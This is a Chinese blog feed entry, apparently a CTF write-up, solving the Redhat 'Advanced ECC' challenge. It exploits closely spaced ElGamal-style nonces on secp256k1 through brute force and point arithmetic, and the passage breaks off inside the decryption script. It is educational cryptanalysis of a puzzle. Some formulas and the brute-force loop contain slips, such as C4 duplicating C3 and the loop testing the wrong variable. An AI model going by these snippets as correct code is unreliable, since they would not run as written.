<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>AirBoi</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-05-02T06:04:51.802Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Boi</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Redhat ctf ECC crypto analyze</title>
    <link href="http://yoursite.com/2018/05/02/Redhat-ctf-ECC-crypto-%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2018/05/02/Redhat-ctf-ECC-crypto-分析/</id>
    <published>2018-05-02T01:53:21.000Z</published>
    <updated>2018-05-02T06:04:51.802Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redhat-CTF中Advanced-ECC-分析"><a href="#Redhat-CTF中Advanced-ECC-分析" class="headerlink" title="Redhat CTF中Advanced ECC 分析"></a>Redhat CTF中Advanced ECC 分析</h1><p>Auth:Boi</p><h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>Advanced ECC</p><p>这道题目感觉不是很难，主要在对椭圆曲线ECC的理解和公式推导上面，但是好多大佬们都没有做，爆破过程没有信心耽误了点时间，导致比赛结束后5分钟get flag，。sad QAQ</p><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extended_gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    x,y = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    lastx, lasty = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, (q, b) = b, divmod(a,b)</span><br><span class="line">        x, lastx = lastx-q*x, x</span><br><span class="line">        y, lasty = lasty-q*y, y</span><br><span class="line">    <span class="keyword">return</span> (a, lastx, lasty)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, _ = extended_gcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x, y)</span>:</span></span><br><span class="line">        self.x, self.y = x, y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">equals</span><span class="params">(self, p)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (self.x == p.x <span class="keyword">and</span> self.y == p.y)  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ECurve</span>:</span></span><br><span class="line">    <span class="comment"># y^2 = x^3 + ax + b mod p</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, a, b, p)</span>:</span></span><br><span class="line">        self.a, self.b, self.p = a, b, p</span><br><span class="line">  </span><br><span class="line">    <span class="comment"># The method checks if the point is a valid point</span></span><br><span class="line">    <span class="comment"># and satisfies 4a^3 + 27b^2 != 0  </span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self, p)</span>:</span></span><br><span class="line">        l = (p.y * p.y) % self.p</span><br><span class="line">        r = (p.x * p.x * p.x + self.a * p.x + self.b) % self.p</span><br><span class="line">        c = <span class="number">4</span> * self.a * self.a * self.a + <span class="number">27</span> * self.b * self.b    </span><br><span class="line">        <span class="keyword">return</span> l == r <span class="keyword">and</span> c != <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Implements point addition P + Q  </span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self, p, q)</span>:</span></span><br><span class="line">        r = Point(<span class="number">0</span>, <span class="number">0</span>)      </span><br><span class="line">        <span class="keyword">if</span> p.equals(r): <span class="keyword">return</span> q</span><br><span class="line">        <span class="keyword">if</span> q.equals(r): <span class="keyword">return</span> p         </span><br><span class="line">        <span class="comment"># if P = Q     </span></span><br><span class="line">        <span class="keyword">if</span> p.equals(q):      </span><br><span class="line">            <span class="keyword">if</span> p.y != <span class="number">0</span>:</span><br><span class="line">                l = ((<span class="number">3</span> * p.x * p.x + self.a) % self.p * modinv(<span class="number">2</span> * p.y, self.p)) % self.p</span><br><span class="line">                r.x = (l * l - <span class="number">2</span> * p.x) % self.p</span><br><span class="line">                r.y = (l * (p.x - r.x) - p.y) % self.p</span><br><span class="line">        <span class="comment"># if P != Q</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> q.x - p.x != <span class="number">0</span>:</span><br><span class="line">                l = ((q.y - p.y) % self.p * modinv(q.x - p.x, self.p)) % self.p</span><br><span class="line">                r.x = (l * l - p.x - q.x) % self.p</span><br><span class="line">                r.y = (l * (p.x - r.x) - p.y) % self.p</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Implements modular multiplication nP</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">multiply</span><span class="params">(self, p, n)</span>:</span></span><br><span class="line">        ret = Point(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">                ret = self.add(ret, p)</span><br><span class="line">            p = self.add(p, p)</span><br><span class="line">            n &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_encrypt</span><span class="params">(curve, C1, C2, k, key)</span>:</span></span><br><span class="line">    kC2 = curve.multiply(C2, k)</span><br><span class="line">    M = curve.add(C1, Point(kC2.x, curve.p - kC2.y))</span><br><span class="line">    <span class="keyword">assert</span>(M.x == key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">advanced_encrypt</span><span class="params">(curve, M, r, k, G, flag)</span>:</span></span><br><span class="line">    <span class="comment"># K 公钥</span></span><br><span class="line">    K = curve.multiply(G, k)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> curve.check(G) <span class="keyword">or</span> <span class="keyword">not</span> curve.check(K) <span class="keyword">or</span> <span class="keyword">not</span> curve.check(M):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Public key is : '</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'G = (0x%x, 0x%x)'</span> % (G.x, G.y)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'K = (0x%x, 0x%x)'</span> % (K.x, K.y)</span><br><span class="line">    key = M.x</span><br><span class="line">    cipher = key ^ flag</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Flag ciphertext is : 0x%x'</span> % cipher</span><br><span class="line">    level = raw_input(<span class="string">'Input the security level of your key : '</span>)</span><br><span class="line">    <span class="keyword">if</span> level == <span class="string">'1'</span>:</span><br><span class="line">        C1 = curve.add(M, curve.multiply(K, r[<span class="number">0</span>]))</span><br><span class="line">        C2 = curve.multiply(G, r[<span class="number">0</span>])</span><br><span class="line">        check_encrypt(curve, C1, C2, k, key)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Key ciphertext : '</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'C1 = (0x%x, 0x%x)'</span> % (C1.x, C1.y)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'C2 = (0x%x, 0x%x)'</span> % (C2.x, C2.y)</span><br><span class="line">    <span class="keyword">elif</span> level == <span class="string">'2'</span>:</span><br><span class="line">        C1 = curve.add(M, curve.multiply(K, r[<span class="number">0</span>] + r[<span class="number">1</span>]))</span><br><span class="line">        C2 = curve.multiply(G, r[<span class="number">0</span>] + r[<span class="number">1</span>])</span><br><span class="line">        check_encrypt(curve, C1, C2, k, key)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Your key ciphertext : '</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'C1 = (0x%x, 0x%x)'</span> % (C1.x, C1.y)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'C2 = (0x%x, 0x%x)'</span> % (C2.x, C2.y)</span><br><span class="line">    <span class="keyword">elif</span> level == <span class="string">'3'</span>:</span><br><span class="line">        C1 = curve.add(M, curve.multiply(K, r[<span class="number">0</span>] + r[<span class="number">1</span>] + r[<span class="number">2</span>]))</span><br><span class="line">        C2 = curve.multiply(G, r[<span class="number">0</span>] + r[<span class="number">1</span>] + r[<span class="number">2</span>])</span><br><span class="line">        check_encrypt(curve, C1, C2, k, key)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Your key ciphertext : '</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'C1 = (0x%x, 0x%x)'</span> % (C1.x, C1.y)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'C2 = (0x%x, 0x%x)'</span> % (C2.x, C2.y)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Bye bye'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">welcom</span><span class="params">()</span>:</span></span><br><span class="line">    signal.alarm(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">r"""</span></span><br><span class="line"><span class="string">    _    ______     ___    _   _  ____ _____ ____    _____ ____ ____ </span></span><br><span class="line"><span class="string">   / \  |  _ \ \   / / \  | \ | |/ ___| ____|  _ \  | ____/ ___/ ___|</span></span><br><span class="line"><span class="string">  / _ \ | | | \ \ / / _ \ |  \| | |   |  _| | | | | |  _|| |  | |    </span></span><br><span class="line"><span class="string"> / ___ \| |_| |\ V / ___ \| |\  | |___| |___| |_| | | |__| |__| |___ </span></span><br><span class="line"><span class="string">/_/   \_\____/  \_/_/   \_\_| \_|\____|_____|____/  |_____\____\____|</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## The main method          </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv=None)</span>:</span></span><br><span class="line">    welcom()</span><br><span class="line">    <span class="comment"># parameters of elliptic curve y^2 = x^3 + ax + b  </span></span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    b = <span class="number">7</span></span><br><span class="line">    p = <span class="number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># base point</span></span><br><span class="line">    G = Point(</span><br><span class="line">    <span class="number">0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798</span>, </span><br><span class="line">    <span class="number">0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># elliptic curve over Fp</span></span><br><span class="line">    <span class="comment"># 描绘曲线</span></span><br><span class="line">    curve = ECurve(a, b, p) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># M:某个点/</span></span><br><span class="line">    <span class="comment"># r:三个数</span></span><br><span class="line">    <span class="comment"># k:私钥</span></span><br><span class="line">    M, k, r = eval(open(<span class="string">'./args'</span>, <span class="string">'r'</span>).read())</span><br><span class="line">    M = Point(M[<span class="number">0</span>], M[<span class="number">1</span>])</span><br><span class="line">    flag = int(open(<span class="string">'./flag'</span>, <span class="string">'r'</span>).read().encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># r[0],r[1],r[2] 相差小于 1048576</span></span><br><span class="line">    <span class="keyword">assert</span>(abs(r[<span class="number">0</span>] - r[<span class="number">1</span>]) &lt;= (<span class="number">1</span> &lt;&lt; <span class="number">20</span>))</span><br><span class="line">    <span class="keyword">assert</span>(abs(r[<span class="number">0</span>] - r[<span class="number">2</span>]) &lt;= (<span class="number">1</span> &lt;&lt; <span class="number">20</span>))</span><br><span class="line">    <span class="keyword">assert</span>(abs(r[<span class="number">1</span>] - r[<span class="number">2</span>]) &lt;= (<span class="number">1</span> &lt;&lt; <span class="number">20</span>))</span><br><span class="line">    advanced_encrypt(curve, M, r, k, G, flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="简述ECC"><a href="#简述ECC" class="headerlink" title="简述ECC"></a>简述ECC</h2><p>ECC 是椭圆曲线加密算法的简称，椭圆曲线作为公钥密码算法，其安全核心为<code>离散对数求解方法问题</code> ，即Q=x*G   知道大数x和某点G可以得到点Q，但是无法逆向求解x。</p><p>椭圆曲线算法可以看作是定义在特殊集合下数的运算，满足一定的规则。椭圆曲线在如下两个域中定义：Fp域和F2m域。</p><blockquote><p>Fp域，素数域，p为素数</p><p>F2m域：特征为2的有限域，称之为二元域或者二进制扩展域。该域中，元素的个数为2m个</p></blockquote><p>举例该题目给的曲线方程为<code>y^2 = x^3 + ax + b (mod p)</code>在Fp域上，函数名<code>secp256k1</code></p><p>一些术语及公式说明：</p><blockquote><ul><li><p>order of a curve(椭圆曲线的阶)</p><p>椭圆曲线所有点的个数，包含无穷远点</p></li><li><p>order of a point(椭圆曲线上点的阶)</p><p>P为椭圆曲线上的点，nP=无穷远点，n取最小整数，既是P的阶</p></li><li><p>base point(基点)</p><p>椭圆曲线参数之一，用G表示，是椭圆曲线上都一个点</p></li><li><p>cofactor(余因子)</p><p>椭圆曲线的余因子，用h表示，为椭圆曲线点的个数/基点的阶</p></li><li><p>椭圆曲线参数(p,a,b,G,n,h)</p><p>p为素数，确定Fp，a和b确定椭圆曲线方程，G为基点，n为G的阶，h为余因子</p></li><li><p>Public key &amp; Private key</p><p>椭圆曲线的私钥是一个随机整数，小于n</p><p>椭圆曲线的公钥是椭圆曲线上的一个点：Q＝私钥*G</p></li><li><p>Point_add</p><p>两个点相加</p></li><li><p>Point_multiply</p><p>点和数的乘法，相当于点的加法。如5P = P+P+P+P+P</p></li><li><p>点的逆</p><p>如G = (4,3)mod7</p><p>-G.x = G.x = 4 ; -G.y = (-G.y)mod(p)</p></li><li><p>椭圆曲线在Fp域内满足<code>交换律</code>、<code>结合律</code>、<code>分配律</code></p></li></ul></blockquote><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>好了，我们已经简单了解了椭圆曲线加密算法，如果想继续深入了解其数学原理，请移步—&gt;<a href="https://www.cnblogs.com/Kalafinaian/p/7392505.html" target="_blank" rel="noopener">ECC椭圆曲线详解</a></p><p>主办方在远程开启了nc端口，通过访问选择level可以获得三个不同的点C1，C2(这里我将其命名为C1-C6)，同时可以得到基点G，公钥(点)K，以及cipher和椭圆曲线参数a,b,p</p><p>首先我们来看main函数<code>curve = ECurve(a, b, p)</code>这里描绘了椭圆曲线curve</p><p>在<code>M, k, r = eval(open(&#39;./args&#39;, &#39;r&#39;).read())</code>这一行输入了点M，私钥k，以及三个大数r，之后在146-148行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span>(abs(r[<span class="number">0</span>] - r[<span class="number">1</span>]) &lt;= (<span class="number">1</span> &lt;&lt; <span class="number">20</span>))</span><br><span class="line"><span class="keyword">assert</span>(abs(r[<span class="number">0</span>] - r[<span class="number">2</span>]) &lt;= (<span class="number">1</span> &lt;&lt; <span class="number">20</span>))</span><br><span class="line"><span class="keyword">assert</span>(abs(r[<span class="number">1</span>] - r[<span class="number">2</span>]) &lt;= (<span class="number">1</span> &lt;&lt; <span class="number">20</span>))</span><br></pre></td></tr></table></figure><p>这三行定义了三个大数任意两者相差的绝对值小于1048576，这里是解题的<code>关键点</code>，我们后续详细阐述。</p><p>接下来是advanced_encrypt函数，76-78行<code>K = curve.multiply(G, k)…</code>行是通过基点G和私钥k的乘积生成公钥K以及校验。</p><p>然后我们可以看到该函数把点M的x坐标作为key 与flag异或得到cipher。（由此我们可知最终求出点M，即可get flag）</p><p>下面即为选择level部分，这里放上我的整理（此处我按照顺序将三个C1，C2命名为C1-C6）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">已知:</span><br><span class="line">    r[<span class="number">3</span>] 任意两者相差abs小于<span class="number">1</span>M</span><br><span class="line">cipher = M.x ^ flag </span><br><span class="line">K = G * x</span><br><span class="line">C1 = M +（K * r[<span class="number">0</span>])</span><br><span class="line">C2 = G * r[<span class="number">0</span>]</span><br><span class="line">C3 = M + (K * (r[<span class="number">0</span>] + r[<span class="number">1</span>]))  </span><br><span class="line">C4 = M + (K * (r[<span class="number">0</span>] + r[<span class="number">1</span>]))  </span><br><span class="line">C5 = M + (K * (r[<span class="number">0</span>] + r[<span class="number">1</span>] + r[<span class="number">2</span>]))</span><br><span class="line">C6 = G * (r[<span class="number">0</span>] + r[<span class="number">1</span>] + r[<span class="number">2</span>])</span><br><span class="line">求解:M</span><br></pre></td></tr></table></figure><p>首先我们可以通过加减法得到以下结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C3 - C1 = K * r1</span><br><span class="line">C5 - C3 = K * r2</span><br><span class="line">C4 - C2 = G * r1</span><br><span class="line">C6 - C4 = G * r2</span><br></pre></td></tr></table></figure><p>这里我的想法是得到r[0] 通过<code>M = C1 - (K * r[0])</code>来得到点M，但是上述推导没有与r[0]相关的结果，同时私钥k我们也不知道 ，无法通过<code>M=C1-k*C2</code>来得到M，于是想到了上面r的范围说明。</p><p>后来想到可以通过<code>r[1]-r[0]</code>或者<code>r[2]-r[0]</code>的结果来降低爆破的复杂度。具体是求<code>G * r[1] - G* r[0]</code>，我们将它的结果设为<code>gr10</code>和<code>gr20</code>并通过分配律可以得到</p><blockquote><p>gr10 = G <em>(r[1]-r[0])  ; gr20 = G </em>(r[2]-r[0])</p><p>gr10 = C4-C2-C2 ; gr20 = C6-C4-C2</p></blockquote><p>举例:通过 <code>curve.add(Gr[1],-C2)</code>得到gr10：再次强调( <code>-C2.x = C2.x;-C2.y= (-C2.y)mod(p)</code>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Gr10 = (<span class="number">0xbeaa019d43c69706101b24750986229dcc980645abd227bc23733b8396f89716</span>, <span class="number">0x5c387d4cbdc7d2fa9372c5e66047d3a9306906299eb0232aa91da9e209a9101e</span>)</span><br><span class="line">Gr20 = (<span class="number">0x8403693e663357dfb7e5954134a237b1ea50f7ecf55e19b5702176d985f6d3c5</span>, <span class="number">0xfcedad1622ac69ae7558e98c6cb5caad4ea32ec4ed72df5f9e5b4c74bd5ab822</span>)</span><br></pre></td></tr></table></figure><p>通过简单的比较，我的判断Gr10&lt;Gr20，所以abs(r[1]-r[0] &lt; r[2]-r[0])&lt;1048576</p><p>随后开启我们的爆破过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute</span><span class="params">(curve, G)</span>:</span></span><br><span class="line">    r = [<span class="number">1048576</span>]</span><br><span class="line">    gr10 = Point(<span class="number">0xbeaa019d43c69706101b24750986229dcc980645abd227bc23733b8396f89716</span>, <span class="number">0x5c387d4cbdc7d2fa9372c5e66047d3a9306906299eb0232aa91da9e209a9101e</span>)</span><br><span class="line">    gr10_brute = curve.multiply(G, r[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">while</span> C2.x != gr10.x :</span><br><span class="line">        r[<span class="number">0</span>] = r[<span class="number">0</span>]+<span class="number">1</span></span><br><span class="line">        gr10_brute = curve.multiply(G, r[<span class="number">0</span>])</span><br><span class="line">         <span class="keyword">print</span> <span class="string">'r[0] = %d gr10_test = (0x%x, 0x%x)'</span> % (r[<span class="number">0</span>],C2.x, C2.y)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\n\n"</span>+<span class="string">"Done"</span>+<span class="string">"\n\n"</span>+r[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>得到结果<code>419665</code> 这里暂时假设r[0]-r[1]&gt;0=419665来进行下面的计算，反之相同</p><p>下面阐述我们的推理过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">因为</span><br><span class="line">C1 = M + (K * r[<span class="number">0</span>])</span><br><span class="line">    K*r[<span class="number">1</span>] = C3 - C1</span><br><span class="line">且</span><br><span class="line">C1 - K*r[<span class="number">1</span>] = M + K*r[<span class="number">0</span>] - K*r[<span class="number">1</span>]</span><br><span class="line">    = M + K*(r[<span class="number">0</span>]-r[<span class="number">1</span>])</span><br><span class="line">r[<span class="number">0</span>] - r[<span class="number">1</span>] = <span class="number">419665</span></span><br><span class="line">而K已知，我们可以得到K*(r[<span class="number">0</span>]-r[<span class="number">1</span>]) </span><br><span class="line">所以</span><br><span class="line">M = C1-K*r[<span class="number">1</span>]-K*(r[<span class="number">0</span>]-r[<span class="number">1</span>])</span><br><span class="line">    M = C1-(C3-C1)-K*(r[<span class="number">0</span>]-r[<span class="number">1</span>])  ps:根据这里也可以判断出r[<span class="number">0</span>]&gt;r[<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>由此我们可以推导出M，得到<code>M.x = 0xeeab4886a54b8d3a066af24fd64f3b2aa7c6b8acd2d661919b2893d6ff240a86</code></p><p>推导脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">advanced_decrypt</span><span class="params">(curve,G)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 已知</span></span><br><span class="line">    cipher = <span class="number">0x666c61677b378bcf71e09c2de9093708ca2ce1770c1e92a4d998ebb303f3fe4ba2b4cd153cfb</span></span><br><span class="line">    K = Point(<span class="number">0xe05fc87bcf70996bedd04fefdf862c1a9d1be7c265aeaa01c064b26d885dbb48</span>, <span class="number">0xb2fc8bd045cc3927b9325dccdfdb0b31524e551bc41640a21578b72bd24d4f95</span>)</span><br><span class="line">    p = <span class="number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F</span></span><br><span class="line">    c1 = Point(<span class="number">0xa4c7ad80c3786c06b864e227564eef0f62ac8846396bd60022d8f1361bfccd76</span>, <span class="number">0x4f1b975180cb7bc0d5f9727483a2c473f933db3996fd1b041fcb06885d40ebac</span>)</span><br><span class="line">    c2 = Point(<span class="number">0x5b9f0eec2da107db668b2bc448ba8a321355c1e91a1144761a75a9995d4e7c9a</span>, <span class="number">0x5c4adca18aa1c00eac68d9ea5ba7f859cc3fc838c2758806e4b0c981b0541a36</span>)</span><br><span class="line">    c3 = Point(<span class="number">0x91dfb73c4ebd8ec249fa933e4c6ccc6bcabb7c9b5bd3dae313deb7c77aa70820</span>, <span class="number">0xc5ed9e124105e5f2b6995300905482236074a89839a45c63e48b078de0a857ea</span>)</span><br><span class="line">    c4 = Point(<span class="number">0x5f16bb008b865364af1d885efb7d823db081419a4dba8c7437caa4bc794b9d33</span>, <span class="number">0x785cba0e0774d699f5ec0b316f5754ad08304102fd111f66db9236664de4256b</span>)</span><br><span class="line">    c5 = Point(<span class="number">0xa0f115089a833a6133a5512ca43b62e572ad3a7e410a6816fd0478bd4ac233f4</span>, <span class="number">0xb498d4d0015b76c953be21f5ec538f8f928ac2bdb7b0ab2fe40c671ced524216</span>)</span><br><span class="line">    c6 = Point(<span class="number">0x4d70eeb520d304c8f2a3217808af2c425fd4632fad084d81f486248ade59750e</span>, <span class="number">0x52cb471ca6c46c2b9da2842b1a928c21417587c52fa07213807b961259e0af5b</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 推导</span></span><br><span class="line">    <span class="comment"># f :负</span></span><br><span class="line">    c1f = Point(c1.x,(-c1.y)%p)</span><br><span class="line">    